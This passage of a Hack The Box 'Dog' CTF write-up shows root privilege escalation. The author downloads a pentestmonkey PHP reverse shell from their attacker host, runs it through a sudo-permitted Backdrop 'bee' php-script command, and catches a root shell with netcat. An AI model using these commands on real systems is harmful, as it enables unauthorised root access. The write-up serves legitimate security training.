    inet 10.10.11.58/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:53ed/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe95:53ed/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Run sudo -l to get a list of commands that we can run as sudo.

{% capture sudol %}
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
Try running bee with sudo to see what it does.

{% capture beecheck %}
johncusack@dog:~$ sudo /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).

<snip>

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=beecheck %}

<br />
Download the pentest monkey so we can feed it into bee.

{% capture downloadmonkey %}
johncusack@dog:~$ wget http://10.10.16.9:8000/shell.php
--2025-06-18 15:21:55--  http://10.10.16.9:8000/shell.php
Connecting to 10.10.16.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  27.6KB/s    in 0.2s    

2025-06-18 15:21:56 (27.6 KB/s) - ‘shell.php’ saved [5491/5491]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadmonkey %}

<br />
Run bee using the php-script command and feed it the pentest monkey script.

{% capture beescript %}
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-script ~/shell.php 
johncusack@dog:/var/www/html$ 
 ℹ  Notice: Undefined variable: daemon
in printit() (line 184 of /home/johncusack/shell.php).

Successfully opened reverse shell to 10.10.16.9:443
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=beescript %}

<br />
Check the listener and catch the root shell.

{% capture catchrootshell %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ sudo rlwrap nc -nlvp 443                  
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.58] 49300
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:34:16 up 2 days, 13:23,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
johncusa pts/1    10.10.16.9       15:10    7.00s  0.14s  0.14s -bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchrootshell %}

<br />
Get the root flag.

{% capture rootflag %}
# cat /root/root.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:53:ed brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.58/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:53ed/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:fe95:53ed/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
Looks like we paws-itively owned the Dog box.  I hope you enjoyed the read.  Look forward to taking the next one with you!

<br />
<h2>Trophy</h2>
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/dog/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>